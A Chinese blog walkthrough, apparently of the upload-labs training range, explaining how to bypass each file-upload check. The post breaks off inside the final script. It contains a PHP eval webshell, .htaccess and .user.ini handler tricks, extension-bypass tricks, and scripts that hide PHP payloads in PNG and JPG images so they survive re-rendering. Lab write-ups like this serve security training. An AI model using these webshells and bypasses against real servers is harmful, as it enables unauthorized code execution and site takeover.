<p><a href="https://www.cnblogs.com/iChet/p/16124082.html">文件上传漏洞之upload-labs靶场通关(20关) - iChet - 博客园</a></p>
<h2 id="对content的过滤"><a href="#对content的过滤" class="headerlink" title="对content的过滤"></a>对content的过滤</h2><p>**&lt;?&#x3D; ?&gt;<strong>与</strong>&lt;?php ?&gt;<strong>与</strong>&lt;script language&#x3D;”php”&gt; &lt;&#x2F;script&gt;**都可以标识php代码。</p>
<p>当文件内容中不能出现&lt;?，&lt;script language&#x3D;”php”&gt;也不能起作用，那么还可以将content进行base64编码，然后借助.htaccess文件解码并解析content。如下：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">AddType application/x<span class="punctuation">-</span>httpd<span class="punctuation">-</span>php .jt</span><br><span class="line">php_value auto_append_file <span class="string">&quot;php://filter/convert.base64-decode/resource=./1.jt</span></span><br></pre></td></tr></table></figure>

<p>PASS-1</p>
<p><strong>只有前端验证，所以我们先选择<code>.jpg</code>后缀的文件，绕过前端验证，再<code>bp</code>抓包修改后缀便可绕过检查。</strong></p>
<p>选择文件<code>exp.jpg</code>其内容如下，<code>bp</code>抓包修改后缀为<code>.php</code>发送，上传成功</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89A   <span class="comment">#这里这个不影响</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;shell&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>F12</code>在查看器中找到上传文件的相对路径</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131915581.png" alt="image-20241015152329058" style="zoom:50%;" />

<p>在蚁剑中连接成功</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131915884.png" alt="image-20241015152616491" style="zoom:50%;" />

<h2 id="MIME验证"><a href="#MIME验证" class="headerlink" title="MIME验证"></a><code>MIME</code>验证</h2><p><strong>添加了<code>MIME</code>信息验证，一般将<code>Content-Type</code>选项修改成<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>这三个中的一个即可。</strong></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131915412.png" alt="image-20241015154351022"></p>
<h2 id="别名替换"><a href="#别名替换" class="headerlink" title="别名替换"></a>别名替换</h2><p><strong>添加了黑名单过滤，不允许上传 <code>.asp .aspx .php .jsp</code>后缀文件，可以通过别名绕过。</strong></p>
<p><code>asp aspx jsp php</code>的别名：</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">asa cer cdx</span><br><span class="line">ashx asmx ascx</span><br><span class="line">jspx jspf</span><br><span class="line">php2 php3 php4 php5 phps phtml     Apache服务器可以替换</span><br></pre></td></tr></table></figure>

<h4 id="wp"><a href="#wp" class="headerlink" title="wp"></a><code>wp</code></h4><p><code>bp</code>抓包，添加别名爆破</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131915351.png" alt="image-20241015163720337" style="zoom:50%;" />

<p>根据<code>Response</code>状态，确定可用别名，成功上传</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131915697.png" alt="image-20241015163919606" style="zoom:50%;" />

<p>在<code>Response</code>中寻找返回的相对路径</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131915703.png" alt="image-20241015164714757" style="zoom:50%;" />

<h2 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a><code>.htaccess</code></h2><p><strong>查看源码，发现黑名单过滤了几乎所有可用后缀，此时就要用到<code>.htaccess</code>了，注意<code>.htaccess</code>是一个文件。</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>​	<code>.htaccess</code>是<code>Apache</code>服务中的一个配置文件，它负责相关目录下的网页配置。通过<code>.htaccess</code>文件，可以帮助实现：网页<code>301</code>重定向，自定义<code>404</code>错误页面，改变文件拓展名，允许&#x2F;阻止特定用户或者目录的访问，配置默认文档等。</p>
<p>​	常用的<code>.htaccess</code>文件格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;exp.jpg&quot;&gt;</span><br><span class="line">	SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>​	<code>SetHandler application/x-httpd-php</code>的意思是设置当前目录的所有文件都使用<code>php</code>解析，那么无论上传什么文件，只要符合<code>php</code>语言代码规范，就会被当作<code>php</code>执行。</p>
<p>这一关我本地环境有问题，是在<a href="http://175.178.67.176:8084/">这里</a>通关的。</p>
<h2 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a><code>.user.ini</code></h2><p>引发<code>.user.ini</code>解析漏洞需要以下三个条件：</p>
<ul>
<li>服务器脚本语言为<code>php</code></li>
<li>服务器使用<code>CGI/FastCGI</code>模式</li>
<li>上传目录下有可执行的<code>php</code>文件</li>
</ul>
<p><code>.user.ini</code>利用：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">auto_prepend_file = exp.jpg</span><br></pre></td></tr></table></figure>

<p>上传该<code>.user.ini</code>文件，再上传<code>exp.jpg</code>文件</p>
<h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><p>源码中没有<code>strtolower()</code>可以利用大小写绕过，<code>strtolower()</code>函数将大写字母转为小写字母。</p>
<h2 id="Pass-0708"><a href="#Pass-0708" class="headerlink" title="Pass-0708"></a><code>Pass-0708</code></h2><p>源码中没有<code>trim()</code>可以空格绕过，没有<code>deldot()</code>可以后缀加点绕过。</p>
<ul>
<li><code>trim()</code>函数会去除字符串中的空格</li>
<li><code>deldot()</code>函数会删除文件名末尾的点</li>
</ul>
<p><strong>注意必须在<code>windows</code>环境下，<code>php</code>版本需为<code>5.3</code>版本，<code>7.3</code>版本不行。</strong></p>
<p>​	如果源码中<code>deldot(),trim()</code>依次存在用来过滤时，如下图，可以使用<code>.php. .</code>的方式绕过，经过两次过滤后剩下的为<code>.php.</code>依然可以绕过黑名单。（在<code>Pass-10</code>中利用此方法通关）</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914526.png" alt="image-20241015225415994" style="zoom:50%;" />

<p>反正就是分析源码，找到绕过方式，如果使用了两次<code>trim()</code>可能要多加一个空格。</p>
<h2 id="DATA"><a href="#DATA" class="headerlink" title="::$DATA"></a><code>::$DATA</code></h2><p>​	在<code>Windows</code>环境下，上传的文件后缀为<code>.php::$DATA</code>时，服务器上会生成一个后缀为<code>.php</code>的文件，其内容与后缀为<code>.php::$DATA</code>的文件的内容一样。</p>
<h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>&#x3D;&#x3D;Pass-11&#x3D;&#x3D;</p>
<p>​	<code>bp</code>改后缀为<code>.pphphp</code>，过滤掉第一个<code>php</code>后，成功上传的文件后缀还是<code>.php</code>；如果改成<code>.phphpp</code>，过滤掉第一个<code>php</code>后，剩下的是<code>.hpp</code>，不可；如果是<code>.phpphp</code>这样，不是双写，不可。</p>
<h2 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h2><p>​	第<code>14</code>关的检查方式是，通过获取上传文件的内容的前两个字节来判断该文件的类型，也就是通过识别文件头判断文件类型。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914749.png" alt="image-20241017191720004" style="zoom:50%;" />

<p>​	第<code>15</code>关则是通过获取<code>getimagesize()</code>函数的返回结果来检查文件类型，<code>getimagesize()</code>函数的返回结果中包含文件大小和文件类型。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914785.png" alt="image-20241017191843665" style="zoom:50%;" />

<p>第<code>16</code>关是通过<code>exif_imagetype()</code>函数来识别文件头。</p>
<p>上面三种检查方法其实都差不多，都可以利用下面两种绕过方法绕过：</p>
<h4 id="添加文件头"><a href="#添加文件头" class="headerlink" title="添加文件头"></a>添加文件头</h4><p>在文件的首行添加<code>GIF89a</code>表示为<code>gif</code>文件，添加<code>PNG</code>文件头表示为<code>png</code>文件</p>
<h4 id="使用copy命令"><a href="#使用copy命令" class="headerlink" title="使用copy命令"></a>使用<code>copy</code>命令</h4><p>在<code>cmd</code>中，执行<code>copy zyt.jpg + exp.php zyt.jpg</code>命令</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914014.png" alt="image-20241017190732155" style="zoom:50%;" />

<p><strong>通关步骤：</strong></p>
<p>先上传下面文件</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914396.png" alt="image-20241017191047498" style="zoom:50%;" />

<p>获取文件路径后配合文件包含漏洞解析脚本</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914040.png" alt="image-20241017191238563" style="zoom:50%;" />

<p>向<code>file</code>传参获取<code>webshell</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914091.png" alt="image-20241017191428286" style="zoom:50%;" />

<h2 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h2><p>&#x3D;&#x3D;Pass-17&#x3D;&#x3D;</p>
<p>本关会先检查文件类型，必须要是不被损坏<code>gif,png,jpg</code>文件，才能上传成功。<br>并且<code>imagecreatefromjpeg()</code>函数会对上传的文件进行二次渲染，保留下来的文件是二次渲染后的文件。<br>最后还要配合文件包含漏洞，解析脚本。</p>
<h4 id="gif"><a href="#gif" class="headerlink" title="gif"></a><code>gif</code></h4><p>直接比较渲染前后的两个文件，找到数据没有发生变化的部分，在渲染前文件中的该部分插入<code>webshell</code>即可。</p>
<p><strong>通关步骤：</strong></p>
<p>上传<code>1.gif</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914203.png" alt="image-20241017212528750" style="zoom:50%;" />

<p>将<code>1.gif</code>与二次渲染后的文件<code>31494.gif</code>比较，找到未变化部分，插入<code>webshell</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914601.png" alt="image-20241017212812152" style="zoom:50%;" />

<p>上传修改后的<code>1.gif</code>，得到二次渲染后的文件<code>32588.gif</code>，现在这个文件中的<code>webshell</code>没有再被修改了</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131914819.png" alt="image-20241017212952403" style="zoom:50%;" />

<p>配合文件包含漏洞成功解析脚本</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131913540.png" alt="image-20241017213048163" style="zoom:50%;" />

<h4 id="png"><a href="#png" class="headerlink" title="png"></a><code>png</code></h4><p><code>ALT+4</code>查看模板运行结果</p>
<p><strong>脚本：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">    <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">    <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">    <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">    <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">    <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">    <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">    <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>0</code>传函数名，<code>1</code>传参数。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503131913292.png" alt="image-20241018210855348" style="zoom:50%;" />

<h4 id="jpg"><a href="#jpg" class="headerlink" title="jpg"></a><code>jpg</code></h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span 